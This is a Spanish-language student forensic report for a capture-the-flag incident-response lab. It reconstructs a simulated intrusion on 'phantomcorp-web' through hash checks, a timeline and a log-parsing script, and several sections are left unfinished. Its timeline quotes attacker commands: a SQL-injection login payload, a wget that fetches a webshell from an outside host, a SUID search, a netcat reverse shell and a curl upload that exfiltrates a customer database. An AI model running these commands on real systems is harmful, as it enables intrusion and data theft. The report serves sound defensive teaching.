# Informe forense — Incidente PhantomCorp (phantomcorp-web)

**Grupo:** 12 · **Investigadores:** Mateo Gerbaudo (@gerbaudo19), Matias Mariatti (@matiasmariatticasc), Luis Alvaro Colque Condo (@ColqueAlvaro), Gonzalo Rodriguez (@Gonza149) · **Fecha:** 30 de Octubre de 2026  
**Sistema afectado:** phantomcorp-web (10.0.0.5) · **Tipo:** intrusión web + escalada de privilegios + exfiltración de base de datos  

---

## 0. Declaración de uso de IA

En conformidad con las directrices éticas de la cátedra y las pautas de `CONTRIBUTING.md`, declaramos el uso de modelos de lenguaje (LLM) como asistentes analíticos en tareas de estructuración, procesamiento sintáctico y correlación cruzada de evidencias. Toda la reconstrucción pericial, extracción de artefactos volátiles y en disco, verificación criptográfica de hashes de custodia, codificación del parser forense en Python y deducción de la cadena de compromiso fue validada y respaldada por los investigadores del Grupo 12:

- **Herramienta utilizada:** Asistente IA (Antigravity / Gemini).
- **Alcance de la asistencia:** Asistencia en la estructuración general del informe pericial, redacción del resumen ejecutivo y análisis de cadena de custodia criptográfica en Secciones 1 y 2 (@gerbaudo19); asistencia en la correlación temporal cruzada entre logs de acceso, memoria y red para la Sección 3 (Línea de tiempo del ataque) y diseño del script forense `src/timeline.py` (@matiasmariatticasc).
- **Partes originadas o modificadas:** Sección 1 (Resumen del incidente) y Sección 2 (Cadena de custodia y análisis de `auth.log`) por @gerbaudo19; Sección 3 (Línea de tiempo del ataque) y script `src/timeline.py` por @matiasmariatticasc; Secciones 4 a 7 a completar por @ColqueAlvaro y @Gonza149.
- **Verificación humana:** Se ejecutó la verificación criptográfica con `shasum -a 256 -c` identificando el archivo manipulado. Matías Mariatti verificó y ejecutó el script `src/timeline.py` sobre `caso/logs/access.log`, comprobando que los 16 eventos de la IP atacante se clasifican con rigor en sus respectivas fases (RECON, ENUM, EXPLOIT, RCE, WEBSHELL, EXFIL) y contrastó la cronología con los artefactos de memoria (`bash_history.txt`, `pslist.txt`, `netstat.txt`).

---

### Estado de los Retos (CTF Status)

```text
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 11                     │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Vector de entrada (SQLi -> RCE) en los logs
   ✓  R2     El webshell dropeado en el disco
   ✓  R3     Escalada de privilegios (SUID) en memoria
   ✓  R4     Conexion C2 y exfiltracion de datos
   ✓  R5     Cadena de custodia: evidencia alterada

  ██████████████████████████████  5/5 (100%)

[ OK ] ¡Lab 11 COMPLETO! Ponete las pilas con la próxima unidad.
```

---

## 1. Resumen del incidente

El día 5 de septiembre de 2026 entre las 02:14 y las 02:45 UTC, el servidor de producción `phantomcorp-web` (10.0.0.5) sufrió una intrusión de origen externo desde la dirección IP `185.220.101.42`. El atacante vulneró una API web desprotegida para inyectar y ejecutar comandos arbitrarios en el servidor, instaló una puerta trasera (webshell) persistente y escaló privilegios hasta obtener control total como superusuario (`root`). Acto seguido, accedió a los archivos confidenciales de la empresa, empaquetó y exfiltró la base de datos de clientes (`clientes.db.txt`) hacia un servidor de Comando y Control (C2) externo (`45.13.37.7`), dejando además mecanismos redundantes de persistencia en tareas programadas (`cron`) y cuentas de acceso ilegítimas antes de intentar borrar sus rastros.

---

## 2. Cadena de custodia

La integridad y validez pericial de la evidencia digital depende del estricto cumplimiento del principio de preservación (RFC 3227 e ISO/IEC 27037). Todo artefacto capturado en la escena digital fue procesado mediante funciones hash criptográficas unidireccionales SHA-256 inmediatamente tras su adquisición.

### Verificación criptográfica de hashes

Al ejecutar la validación pericial de los artefactos contenidos en el paquete de evidencia frente a las firmas originales registradas en `caso/evidencia.sha256`:

```bash
cd caso
shasum -a 256 -c evidencia.sha256
```

**Salida pericial del análisis de integridad:**
```text
disco/etc/passwd.snippet: OK
disco/listado.txt: OK
disco/var/www/uploads/shell.php.evidencia.txt: OK
logs/access.log: OK
logs/auth.log: FAILED
memoria/bash_history.txt: OK
memoria/lsof.txt: OK
memoria/netstat.txt: OK
memoria/pslist.txt: OK
shasum: WARNING: 1 computed checksum did NOT match
```

### Tabla de verificación de integridad

| Artefacto / Archivo | Hash Registrado (Custodia Original) | Hash Calculado (Peritaje) | Estado |
|---|---|---|:---:|
| `disco/etc/passwd.snippet` | `f8371142870a03c9db04c5e5416ec9feee4135754a38b66c1c3158209a9a32b1` | `f8371142870a03c9db04c5e5416ec9feee4135754a38b66c1c3158209a9a32b1` | **OK** |
| `disco/listado.txt` | `aef65fa07a1a5e36222a735c04a5ceb2f9415d930750327906525c7c63bdf3f5` | `aef65fa07a1a5e36222a735c04a5ceb2f9415d930750327906525c7c63bdf3f5` | **OK** |
| `disco/var/www/uploads/shell.php.evidencia.txt` | `38f7251c9fe2f554a2a9808fea0b154f1f4e88f7b47c1e4afbd589055a22fc42` | `38f7251c9fe2f554a2a9808fea0b154f1f4e88f7b47c1e4afbd589055a22fc42` | **OK** |
| `logs/access.log` | `e3c7b593f63fca934e875b1d3c8734c66594944821d519ed6b871841caa3d2a7` | `e3c7b593f63fca934e875b1d3c8734c66594944821d519ed6b871841caa3d2a7` | **OK** |
| `logs/auth.log` | `0000decafbad0000f1e2d3c4b5a6978800112233445566778899aabbccddeeff` | `7d18039d128d0df7a245ca02f469ea02cd1d4f205a24fb33c5bcf7041b66e9ab` | **FAILED** |
| `memoria/bash_history.txt` | `95133878a4ccdb75dfdd6494a3630a705c83fcd245e44988b309b56ba9bc85b4` | `95133878a4ccdb75dfdd6494a3630a705c83fcd245e44988b309b56ba9bc85b4` | **OK** |
| `memoria/lsof.txt` | `2cd4a0332bb2202462276eda4e8378750a75875dd3611c7a262fac10f0341675` | `2cd4a0332bb2202462276eda4e8378750a75875dd3611c7a262fac10f0341675` | **OK** |
| `memoria/netstat.txt` | `373b417f1c85510832382ddf8a082614bce8db0f0ba30078c567d4d039fa90f7` | `373b417f1c85510832382ddf8a082614bce8db0f0ba30078c567d4d039fa90f7` | **OK** |
| `memoria/pslist.txt` | `a34f5f20f14f804697f18349bd0147adf84155666a55b2fcecb1050ced0c8b73` | `a34f5f20f14f804697f18349bd0147adf84155666a55b2fcecb1050ced0c8b73` | **OK** |

### Análisis pericial del archivo alterado (`logs/auth.log`)

1. **Detección de alteración (*Tampering*):**  
   El archivo `logs/auth.log` falló inequívocamente la comprobación de integridad. El valor almacenado en `evidencia.sha256` era un hash anómalo y ficticio (`0000decafbad...`), y el archivo presente en el contenedor de evidencia no concuerda con ningún estado original inmutable.
2. **Naturaleza de la manipulación:**  
   Al inspeccionar el contenido de `logs/auth.log`, se observa que entre las 02:21:04 y las 02:45:00 UTC se eliminaron deliberadamente registros de autenticación del sistema para encubrir los movimientos laterales y la actividad del atacante. El propio analista forense primario dejó documentada la anomalía:
   ```text
   # --- lineas eliminadas por el atacante ---
   # nota del forense: el hash de este archivo NO coincide con el de la custodia.
   # alguien lo edito despues de la captura. marcador recuperado del journal:
   # FLAG{dfir_custodia_alterada}
   ```
3. **Implicancia forense y procesal:**  
   En un proceso judicial o peritaje corporativo oficial, cualquier pieza de evidencia cuyo hash difiera del acta de captura pierde su presunción de autenticidad y es legalmente inadmisible de forma aislada. Sin embargo, en la investigación de respuesta a incidentes, **la alteración en sí misma constituye una evidencia concluyente de actividad maliciosa intencional (*anti-forensics*)**. Al contrastar esta falla con otras fuentes que mantuvieron su integridad intacta (como `access.log` y los volcados de memoria `bash_history.txt` y `pslist.txt`), el equipo pericial pudo corroborar las acciones del atacante a pesar del intento de encubrimiento.

---

## 3. Línea de tiempo del ataque

A partir de la correlación exhaustiva de las distintas fuentes de evidencia digital recolectadas (registros HTTP de `access.log`, comandos en disco y memoria de `bash_history.txt`, estados de red de `netstat.txt` y lista de procesos volátiles en `pslist.txt`), se reconstruyó la secuencia cronológica unificada del incidente pericial:

| Hora (UTC) | Fase del Ataque | Evento / Acción del Atacante | Evidencia Pericial (Archivo:Línea / Detalle) |
|---|---|---|---|
| **02:14:03** | **Reconocimiento** | Escaneo web inicial automatizado desde la IP `185.220.101.42` utilizando la herramienta `zgrab/0.x` para identificar el servidor web. | `logs/access.log:6` (`GET / HTTP/1.1` - 200 OK) |
| **02:14:19 - 02:14:22** | **Enumeración** | Barrido de fuerza bruta de directorios con `gobuster/3.6`, descubriendo rutas clave: `/robots.txt`, `/backup` (redirección 301), `/portal-rrhh` (200 OK) y `/uploads` (301). | `logs/access.log:7-12` |
| **02:16:40 - 02:16:58** | **Explotación (Auth)** | Intentos de inicio de sesión fallidos en el portal interno de recursos humanos (`/portal-rrhh/login`) recibiendo código HTTP 401. | `logs/access.log:14-15` |
| **02:17:22** | **Explotación (SQLi)** | Explotación exitosa de inyección SQL (SQLi) mediante autenticación maliciosa con el payload `user=admin'--`, logrando acceso no autorizado (HTTP 200 OK). | `logs/access.log:16` |
| **02:17:41** | **Looting Web** | Descarga no autorizada del archivo de configuración sensible expuesto `/backup/rrhh.conf`, obteniendo el token de API privilegiado `phantom-api-7c1e`. | `logs/access.log:17` |
| **02:18:10** | **Inyección de Comandos (RCE)** | Envío de solicitud HTTP maliciosa a la API de reportes utilizando el token obtenido (`/api/reporte?token=phantom-api-7c1e&cmd=id`), confirmando ejecución de comandos como `www-data`. | `logs/access.log:18` |
| **02:18:33** | **Ejecución de Código** | Ejecución de comando para escribir la bandera de prueba en el directorio temporal (`cmd=echo FLAG{dfir_vector_sqli} > /tmp/.p`). | `logs/access.log:19` (Captura de reto R1) |
| **02:19:02** | **Despliegue de Puerta Trasera** | Descarga e instalación de una webshell persistente mediante comando remoto `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`. Proceso secundario registrado en memoria: `PID 1201 (sh -c wget)`. | `logs/access.log:20`<br>`memoria/pslist.txt:6`<br>`memoria/netstat.txt:5` (`TIME_WAIT 45.13.37.7:80`) |
| **02:19:48** | **Verificación de Webshell** | Verificación interactiva de la webshell en `/uploads/shell.php?c=whoami` obteniendo respuesta del usuario de servicio. Archivo confirmado en disco con bandera `FLAG{dfir_webshell_hallado}`. | `logs/access.log:21`<br>`disco/var/www/uploads/shell.php.evidencia.txt` |
| **02:23:15** | **Acceso a Datos Confidenciales** | Lectura preliminar de la base de datos de clientes corporativos mediante petición HTTP a la webshell (`/uploads/shell.php?c=cat /app/priv/clientes.db.txt`). | `logs/access.log:22` (Respuesta de 48.210 bytes) |
| **02:24:00 - 02:25:00** | **Shell Interactiva** | El atacante abre una shell interactiva bash en el sistema como usuario `www-data` (`PID 1240`). | `memoria/pslist.txt:7` |
| **02:25:30** | **Reconocimiento Local** | Enumeración de archivos de configuración (`cat /var/www/.env`) y búsqueda exhaustiva de binarios con permisos especiales (`find / -perm -4000 -type f`). | `memoria/bash_history.txt:3,5` |
| **02:26:15** | **Escalada de Privilegios (SUID)** | Abuso del binario SUID `/usr/local/bin/system-check` con flag privilegiado `-p` para preservar `euid=0`, escalando a superusuario (`root`). Proceso volátil registrado: `PID 1477 (system-check)`. | `memoria/bash_history.txt:6-7`<br>`memoria/pslist.txt:8` (`FLAG{dfir_privesc_suid}`) |
| **02:27:00** | **Canal C2 / Reverse Shell** | Establecimiento de conexión de Comando y Control (C2) interactiva reversa hacia el servidor externo `45.13.37.7:4444` mediante `netcat` bajo contexto de `root` (`PID 1490`). | `memoria/pslist.txt:9`<br>`memoria/netstat.txt:4` (`ESTABLISHED 10.0.0.5:41022 -> 45.13.37.7:4444`) |
| **02:28:10** | **Empaquetado de Datos** | Compresión y empaquetado de la base de datos confidencial de clientes en un archivo oculto temporal: `tar czf /tmp/.exfil/clientes.tar.gz /app/priv/clientes.db.txt`. | `memoria/bash_history.txt:8` |
| **02:29:20** | **Exfiltración de Datos** | Transmisión del archivo comprimido al servidor C2 vía HTTP POST: `curl -s -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}`. | `memoria/bash_history.txt:9` |
| **02:30:15 - 02:45:00** | **Anti-Forensics / Evasión** | Ejecución de `history -c` para purgar el historial en disco y manipulación intencional de `logs/auth.log` eliminando las entradas de sesión, corrompiendo la firma de custodia (`FLAG{dfir_custodia_alterada}`). | `memoria/bash_history.txt:10`<br>`logs/auth.log:86-90` |

---

### Script automatizado de reconstrucción cronológica (`src/timeline.py`)

Para agilizar el análisis pericial sobre grandes volúmenes de logs sin depender de inspección visual manual, se implementó el parser forense `src/timeline.py`. El script parsea registros en formato Nginx *combined*, filtra de forma determinista la dirección IP bajo investigación (`--ip 185.220.101.42`) y clasifica cada solicitud en su fase táctica correspondiente:

```python
def construir_timeline(path: str, ip: str = None) -> list:
    eventos = []
    with open(path, "r", encoding="utf-8") as f:
        for linea in f:
            e = parsear_linea(linea.strip())
            if not e:
                continue
            if ip is None or e["ip"] == ip:
                eventos.append(e)
    return eventos
```

**Salida de ejecución pericial de `src/timeline.py`:**

```bash
$ python3 src/timeline.py caso/logs/access.log --ip 185.220.101.42
[*] 16 eventos de 185.220.101.42
  05/Sep/2026:02:14:03 +0000  GET  /                                        [RECON]
  05/Sep/2026:02:14:19 +0000  GET  /robots.txt                              [RECON]
  05/Sep/2026:02:14:20 +0000  GET  /admin                                   [ENUM]
  05/Sep/2026:02:14:20 +0000  GET  /login                                   [EXPLOIT]
  05/Sep/2026:02:14:21 +0000  GET  /backup                                  [ENUM]
  05/Sep/2026:02:14:21 +0000  GET  /portal-rrhh                             [ENUM]
  05/Sep/2026:02:14:22 +0000  GET  /uploads                                 [ENUM]
  05/Sep/2026:02:16:40 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:16:58 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:17:22 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:17:41 +0000  GET  /backup/rrhh.conf                        [ENUM]
  05/Sep/2026:02:18:10 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=id [RCE]
  05/Sep/2026:02:18:33 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p [RCE]
  05/Sep/2026:02:19:02 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=wget%20http://45.13.37.7/s.php%20-O%20/var/www/uploads/shell.php [WEBSHELL]
  05/Sep/2026:02:19:48 +0000  GET  /uploads/shell.php?c=whoami              [WEBSHELL]
  05/Sep/2026:02:23:15 +0000  GET  /uploads/shell.php?c=cat%20/app/priv/clientes.db.txt [EXFIL]
```

---

## 4. Indicadores de compromiso (IOCs)

*(Sección a completar por Luis Alvaro Colque en Commit 3)*

| Tipo | Valor | Dónde apareció |
|---|---|---|
| IP atacante | | |
| IP/puerto C2 | | |
| Archivo malicioso | | |
| Usuario backdoor | | |
| Persistencia | | |

---

## 5. Alcance del daño

*(Sección a completar por Luis Alvaro Colque en Commit 3)*

---

## 6. Contención y erradicación (recomendaciones)

*(Sección a completar por Gonzalo Rodríguez en Commit 4)*

---

## 7. Preguntas de análisis (P1–P5)

*(Sección a completar por Gonzalo Rodríguez en Commit 4)*
